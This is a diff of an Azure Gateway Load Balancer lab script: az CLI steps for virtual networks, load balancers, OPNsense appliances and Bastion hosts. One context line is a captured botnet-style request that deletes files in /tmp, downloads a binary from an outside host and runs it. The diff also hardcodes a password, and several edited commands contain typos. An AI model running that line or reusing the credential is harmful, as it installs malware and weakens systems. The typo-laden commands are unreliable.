@@ -13,20 +13,23 @@ az account set --subscription DMAUSER-MS #My Microsoft Internal Subscription
 
 ### Consumer ###
 # Define variables based on your requirements
-rg=gwlb-lab
-location=centralus
+consumer_rg=gwlb-lab2
+consumer_location=centralus
 consumervnetcidr="10.100.0.0/24"
 consumersubnet="10.100.0.0/27"
+consumerbastionsubnet="10.100.0.32/27"
 mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
+echo "Type username and password"
+read -p 'Username: ' username && read -sp 'Password: ' password 
 
 # 1) Create Consumer VNET and subnet
-az group create --name $rg --location $location --output none
-az network vnet create --resource-group $rg --name consumer-vnet --location $location --address-prefixes $consumervnetcidr --subnet-name vmsubnet --subnet-prefix $consumersubnet --output none
+az group create --name $consumer_rg --location $consumer_location --output none
+az network vnet create --resource-group $consumer_rg --name consumer-vnet --location $consumer_location --address-prefixes $consumervnetcidr --subnet-name vmsubnet --subnet-prefix $consumersubnet --output none
 
 # 2) #(Optional) UDR to restrict SSH access to Azure VMs from your Public IP only:
-az network nsg create --resource-group $rg --name nsg-default --location $location
+az network nsg create --resource-group $consumer_rg --name nsg-default --location $consumer_location
 az network nsg rule create \
-    --resource-group $rg \
+    --resource-group $consumer_rg \
     --nsg-name nsg-default \
     --name AllowSSHRule \
     --direction Inbound \
@@ -40,7 +43,7 @@ az network nsg rule create \
     --description "Allow inbound SSH" \
     --output none
 az network nsg rule create \
-    --resource-group $rg \
+    --resource-group $consumer_rg \
     --nsg-name nsg-default \
     --name allow-http \
     --direction Inbound \
@@ -53,66 +56,62 @@ az network nsg rule create \
     --protocol Tcp \
     --description "Allow inbound HTTP" \
     --output none
-az network vnet subnet update --name vmsubnet --resource-group $rg --vnet-name consumer-vnet --network-security-group nsg-default --output none
+az network vnet subnet update --name vmsubnet --resource-group $consumer_rg --vnet-name consumer-vnet --network-security-group nsg-default --output none
 
 # 3) Create Public Load Balancer
-az network lb create -g $rg --name consumer-elb --sku Standard --frontend-ip-name frontendip1 --backend-pool-name vmbackend --output none
-az network lb probe create -g $rg --lb-name consumer-elb --name httpprobe --protocol tcp --port 80 --output none
-az network lb rule create -g $rg --lb-name consumer-elb --name http-lb-rule --protocol TCP --frontend-ip-name frontendip1 --backend-pool-name vmbackend --probe-name httpprobe --frontend-port 80 --backend-port 80 --output none
-az network lb inbound-nat-rule create -g $rg --lb-name consumer-elb -n sshnat --protocol Tcp --frontend-port 50000 --backend-port 22
+az network lb create -g $consumer_rg --name consumer-elb --sku Standard --frontend-ip-name frontendip1 --backend-pool-name vmbackend --output none
+az network lb probe create -g $consumer_rg --lb-name consumer-elb --name httpprobe --protocol tcp --port 80 --output none
+az network lb rule create -g $consumer_rg --lb-name consumer-elb --name http-lb-rule --protocol TCP --frontend-ip-name frontendip1 --backend-pool-name vmbackend --probe-name httpprobe --frontend-port 80 --backend-port 80 --output none
+az network lb inbound-nat-rule create -g $consumer_rg --lb-name consumer-elb -n sshnat --protocol Tcp --frontend-port 50000 --backend-port 22
 
 # 4) Deploy Azure VM with NGX using a simple test Website
-# 4.1) Set username and password variables.
-echo "Type username and password"
-read -p 'Username: ' username && read -sp 'Password: ' password 
+az network nic create --resource-group $consumer_rg -n consumer-vm-nic --location $consumer_location --subnet vmsubnet --vnet-name consumer-vnet --output none
+az vm create -n consumer-vm -g $consumer_rg --image UbuntuLTS --size Standard_B1s --admin-username $username --admin-password $password --nics consumer-vm-nic --no-wait --location $consumer_location --output none
 
-# 4.2) Create VM
-az network nic create --resource-group $rg -n consumer-vm-nic --location $location --subnet vmsubnet --vnet-name consumer-vnet --output none
-az vm create -n consumer-vm -g $rg --image UbuntuLTS --size Standard_B1s --admin-username $username --admin-password $password --nics consumer-vm-nic --no-wait --location $location --output none
+# ) Attach VM to LB Rule and NAT Rule
+az network nic ip-config address-pool add --address-pool vmbackend --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
+az network nic ip-config inbound-nat-rule add --inbound-nat-rule sshnat --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $consumer_rg --lb-name consumer-elb --output none
 
-# 5) Attach VM to LB Rule and NAT Rule
-az network nic ip-config address-pool add --address-pool vmbackend --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $rg --lb-name consumer-elb --output none
-az network nic ip-config inbound-nat-rule add --inbound-nat-rule sshnat --ip-config-name ipconfig1 --nic-name consumer-vm-nic --resource-group $rg --lb-name consumer-elb --output none
+# 6) Install nginx and test website (Move this to cloud.ini)
+az vm extension set --resource-group $consumer_rg --vm-name consumer-vm --name CustomScript --settings '{"commandToExecute": "apt-get -y update && apt-get -y install nginx && echo Test Website on consumer-vm > /var/www/html/index.html"}' --publisher Microsoft.Azure.Extensions --no-wait
 
-# 6) Install nginx and test website
-az vm extension set --resource-group $rg --vm-name consumer-vm --name CustomScript --settings '{"commandToExecute": "apt-get -y update && apt-get -y install nginx && echo Test Website on consumer-vm > /var/www/html/index.html"}' --publisher Microsoft.Azure.Extensions --no-wait
-
+# 7) Deploy Bastion
+az network vnet subnet create --resource-group $consumer_rg --name AzureBastionSubnet --vnet-name consumer-vnet --address-prefixes $consumerbastionsubnet --output none
+az network public-ip create --resource-group $consumer_rg --name consumer-bastion-pip --sku Standard --location $consumer_location
+az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location
 
 ### Provider ###
 #Variables
-rg=gwlb-lab4
-location=centralus
+provider_rg=gwlb-lab2
+provider_location=centralus
 providervnetcidr="10.0.0.0/24"
 providerexternalcidr="10.0.0.0/27"
 providerinternalcidr="10.0.0.32/27"
-nva1=provider-nva1
+providerbastionsubnet="10.0.0.64/27"
+nva=provider-nva
 mypip=$(curl -4 ifconfig.io -s) # or replace with your home public ip, example mypip="1.1.1.1" (required for Cloud Shell deployments)
 
 # 1) Create provider VNET and Internal/External 
-az group create --name $rg --location $location --output none
-az network vnet create --resource-group $rg --name provider-vnet --location $location --address-prefixes $providervnetcidr --subnet-name external --subnet-prefix $providerexternalcidr --output none
-az network vnet subnet create --name internal --resource-group $rg --vnet-name provider-vnet --address-prefix $providerinternalcidr --output none
+az group create --name $provider_rg --provider_location $provider_location --output none
+az network vnet create --resource-group $provider_rg --name provider-vnet --location $provider_location --address-prefixes $providervnetcidr --subnet-name external --subnet-prefix $providerexternalcidr --output none
+az network vnet subnet create --name internal --resource-group $provider_rg --vnet-name provider-vnet --address-prefix $providerinternalcidr --output none
 
 # 2) Enable Gateway LB 
-az network lb create -g $rg --name provider-gwlb --sku Gateway --frontend-ip-name frontendip1 --backend-pool-name nvabackend --vnet-name provider-vnet --subnet internal
-az network lb address-pool tunnel-interface add --address-pool nvabackend --identifier '801' --lb-name provider-gwlb --protocol VXLAN --resource-group $rg --type External --port '10801'
-az network lb probe create -g $rg --lb-name provider-gwlb --name sshprobe --protocol tcp --port 22   
-az network lb rule create -g $rg --lb-name provider-gwlb --name haportrule --protocol all --frontend-ip-name frontendip1 --backend-pool-name nvabackend --probe-name sshprobe --frontend-port 0 --backend-port 0 
+az network lb create -g $provider_rg --name provider-nva-glb --sku Gateway --frontend-ip-name frontendip1 --backend-pool-name nvabackend --vnet-name provider-vnet --subnet internal
+az network lb address-pool tunnel-interface add --address-pool nvabackend --identifier '801' --lb-name provider-nva-glb --protocol VXLAN --resource-group $provider_rg --type External --port '10801'
+az network lb probe create -g $provider_rg --lb-name provider-nva-glb --name sshprobe --protocol tcp --port 22   
+az network lb rule create -g $provider_rg --lb-name provider-nva-glb --name haportrule --protocol all --frontend-ip-name frontendip1 --backend-pool-name nvabackend --probe-name sshprobe --frontend-port 0 --backend-port 0 
 
 # 3) Deploy both OPNsense NVA (work on this)
-gwlbpip=$(az network lb show -g $rg --name provider-gwlb --query "frontendIpConfigurations[].privateIpAddress" -o tsv)
-
-OpnScriptURI="https://raw.githubusercontent.com/dmauser/azure-gateway-lb/main/scripts/"
-ShellScriptName="gwlbconfig.sh"
-ShellParameters=([1]=$gwlbpip [2]=$ShellScriptName)
-
-az deployment group create --name nva-deploy-$RANDOM --resource-group $rg \
+az deployment group create --name nva$-deploy-$RANDOM --resource-group $provider_rg \
 --template-uri "https://raw.githubusercontent.com/dmauser/azure-gateway-lb/main/bicep/main-active-active.json" \
---parameters virtualMachineSize=Standard_B2s virtualMachineName=nva TempUsername=azureuser TempPassword=Msft123Msft123 existingVirtualNetworkName=provider-vnet existingUntrustedSubnet=external existingTrustedSubnet=internal PublicIPAddressSku=Standard \
+--parameters virtualMachineSize=Standard_B2s virtualMachineName=nva$ TempUsername=azureuser TempPassword=Msft123Msft123 existingVirtualNetworkName=provider-vnet existingUntrustedSubnet=external existingTrustedSubnet=internal PublicIPAddressSku=Standard \
 --no-wait
 
-# 4) Attach NVA behind GB-LB:
-az network nic ip-config address-pool add --address-pool nvabackend --ip-config-name ipconfig1 --nic-name provider-nva1-Trusted-NIC --resource-group $rg --lb-name provider-gwlb --output none
+# 7) Deploy Bastion
+az network vnet subnet create --resource-group $provider_rg --name AzureBastionSubnet --vnet-name provider-vnet --address-prefixes $providerbastionsubnet --output none
+az network public-ip create --resource-group $provider_rg --name provider-bastion-pip --sku Standard --location $provider_location --output none
+az network bastion create --name provider-bastion --sku basic  --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location
 
 # ***OPNSense UI*** 
 # -> Interfaces -> Other 
@@ -150,28 +149,26 @@ EOL
 chmod +x /usr/local/etc/rc.syshook.d/start/25-azure
 
 # Demo (make changes based on your needs)
-ssh dmauser@40.122.247.106 #Jumpbox
-ssh root@10.0.0.37 #LAN interface OPNSense
 # Attach LB to GW (different sub)
 # Check current sub
 az account list --query "[?isDefault == \`true\`].{Name:name, IsDefault:isDefault}" -o table
 # MSDN Sub
 az account set --subscription MSDN_Dmauser  #MSDN
-feid=$(az network lb frontend-ip show -g $rg --lb-name gwlb --name frontendip1 --query id --output tsv)
+feid=$(az network lb frontend-ip show -g $provider_rg --lb-name provider-nva-glb --name FW --query id --output tsv)
 echo $feid
 
 # MS Sub
 # Add GLB chain
 az account set --subscription DMAUSER-MS #Microsoft
-az network lb frontend-ip update -g $rg --name frontendip1 --lb-name elb-std --public-ip-address PublicIPelb-std --gateway-lb $feid
+az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb $feid -output none
 
 # Validate GLB chain
 az account set --subscription DMAUSER-MS #Microsoft
-az network lb frontend-ip show -g $rg --name frontendip1 --lb-name elb-std --query gatewayLoadBalancer.id -o tsv
+az network lb frontend-ip show -g $consumer_rg --name frontendip1 --lb-name consumer-elb --query gatewayLoadBalancer.id -o tsv
 
 #Remove GLB chain
 az account set --subscription DMAUSER-MS #Microsoft
-az network lb frontend-ip update -g $rg --name frontendip1 --lb-name elb-std --public-ip-address PublicIPelb-std --gateway-lb ""
+az network lb frontend-ip update -g $consumer_rg --name frontendip1 --lb-name consumer-elb --public-ip-address PublicIPconsumer-elb --gateway-lb ""
 
 #Provider Jumpbox
 ssh dmauser@168.61.178.81
@@ -191,7 +188,7 @@ curl http://40.77.94.253/shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+
 # Connectivity Checks / Replace the Public IP listed below with your LB.
 # Get you LB Public IP:
 az account set --subscription DMAUSER-MS #Microsoft
-az network public-ip show -g $rg --name PublicIPconsumer-elb --query ipAddress -o tsv
+az network public-ip show -g $consumer_rg --name PublicIPconsumer-elb --query ipAddress -o tsv
 
 # Port 50000 - NAT Rule to 22 Consumer-VM Backend
 psping -t 40.77.94.253:50000
@@ -214,6 +211,21 @@ ssh dmauser@40.122.156.70
 
 #OPN Capture oubound traffic 
 tcpdump -n -i vxlan1 host 8.8.8.8 
+
+
+# Recommended for savings
+# Set variables
+$consumer_rg=
+$consumer_location=
+$provider_rg=
+$provider_location=
+# 1) Delete Bastion
+az network bastion delete --resource-group $consumer_rg --name consumer-bastion --no-wait
+az network bastion delete --resource-group $provider_rg --name provider-bastion --no-wait
+# 2) Add Bastion
+az network bastion create --name provider-bastion --sku basic --public-ip-address provider-bastion-pip --resource-group $provider_rg --vnet-name provider-vnet --location $provider_location --no-wait
+az network bastion create --name consumer-bastion --sku basic  --public-ip-address consumer-bastion-pip --resource-group $consumer_rg --vnet-name consumer-vnet --location $consumer_location --no-wait
+# Wait about 5 minutes to complete Bastion deployment.
 
 
 #Troubleshooting
